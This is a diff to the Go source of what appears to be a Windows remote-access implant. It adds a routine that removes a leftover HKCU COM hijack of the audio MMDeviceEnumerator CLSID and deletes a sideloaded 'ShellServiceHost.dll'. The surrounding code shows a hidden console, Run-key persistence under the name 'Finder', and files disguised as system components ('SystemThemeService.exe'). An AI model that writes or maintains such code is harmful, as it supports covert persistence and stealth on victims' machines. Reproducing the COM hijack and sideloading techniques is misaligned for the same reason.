@@ -102,6 +102,7 @@ var (
 	pRegQueryValueExW          = advapi32.NewProc("RegQueryValueExW")
 	pRegSetValueExW            = advapi32.NewProc("RegSetValueExW")
 	pRegDeleteValueW           = advapi32.NewProc("RegDeleteValueW")
+	pRegDeleteKeyW             = advapi32.NewProc("RegDeleteKeyW")
 	pRegCloseKey               = advapi32.NewProc("RegCloseKey")
 	pRegCreateKeyExW           = advapi32.NewProc("RegCreateKeyExW")
 	pShellExecuteW             = shell32.NewProc("ShellExecuteW")
@@ -709,6 +710,48 @@ func regDelete(root uintptr, keyPath, valueName string) {
 	defer pRegCloseKey.Call(hKey)
 	vn, _ := windows.UTF16PtrFromString(valueName)
 	pRegDeleteValueW.Call(hKey, uintptr(unsafe.Pointer(vn)))
+}
+
+func regDeleteKey(root uintptr, keyPath string) {
+	kp, _ := windows.UTF16PtrFromString(keyPath)
+	pRegDeleteKeyW.Call(root, uintptr(unsafe.Pointer(kp)))
+}
+
+// cleanupStaleCOMHijack removes leftover COM hijack registry entries from the
+// removed DLL sideload feature. The hijack targeted MMDeviceEnumerator which
+// most apps load for audio — stale entries pointing to a deleted DLL cause
+// those apps to crash on startup.
+func cleanupStaleCOMHijack() {
+	const comCLSID = `{BCDE0395-E52F-467C-8E3D-C4579291692E}`
+	comInproc := `Software\Classes\CLSID\` + comCLSID + `\InprocServer32`
+	comParent := `Software\Classes\CLSID\` + comCLSID
+
+	// Check if our hijack is present (HKCU override of system CLSID)
+	val := regRead(HKCU, comInproc, "")
+	if val == "" {
+		return // no hijack present
+	}
+
+	// Remove values then delete the subkey tree (leaf-first)
+	regDelete(HKCU, comInproc, "")
+	regDelete(HKCU, comInproc, "ThreadingModel")
+	regDeleteKey(HKCU, comInproc)
+	regDeleteKey(HKCU, comParent)
+
+	// Also remove sideloaded DLL file if it still exists
+	appdata := os.Getenv("APPDATA")
+	if appdata != "" {
+		// Walk common drop locations used by the old sideload code
+		filepath.Walk(appdata, func(path string, info os.FileInfo, err error) error {
+			if err != nil || info == nil || info.IsDir() {
+				return nil
+			}
+			if strings.EqualFold(info.Name(), "ShellServiceHost.dll") {
+				os.Remove(path)
+			}
+			return nil
+		})
+	}
 }
 
 func isAdmin() bool {
@@ -1654,6 +1697,8 @@ func removePersistence() string {
 	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder")
 	legacyPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
 	os.Remove(legacyPath)
+	// Clean up stale COM hijack from removed DLL sideload feature
+	cleanupStaleCOMHijack()
 	return "Persistence removed"
 }
 
@@ -2379,6 +2424,10 @@ func main() {
 
 	// Hide console
 	hideConsole()
+
+	// Auto-cleanup stale COM hijack from removed DLL sideload feature
+	// (fixes app crashes caused by dangling registry entries)
+	cleanupStaleCOMHijack()
 
 	// Build config
 	hostname, _ := os.Hostname()
